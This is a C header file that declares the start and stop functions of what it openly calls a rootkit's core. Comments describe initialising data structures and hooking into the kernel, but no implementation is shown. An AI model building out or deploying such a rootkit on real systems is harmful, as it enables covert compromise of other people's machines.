#ifndef RK_CORE_H
#define RK_CORE_H

/**
 * @file core.h
 * 
 * @brief Core functionality of the rootkit
 */

#include "debug.h"

/**
 * @brief Start the core functionality of the rootkit
 * 
 * This function starts the core functionality of the rootkit. It initializes
 * any necessary data structures and hooks into the kernel.
 * 
 * @return 0 on success, -1 on failure
 */
int core_start(void);

/**
 * @brief Stop the core functionality of the rootkit
 * 
 * This function stops the core functionality of the rootkit. It cleans up any
 * resources that were allocated during initialization.
 */
void core_stop(void);

#endif // RK_CORE_H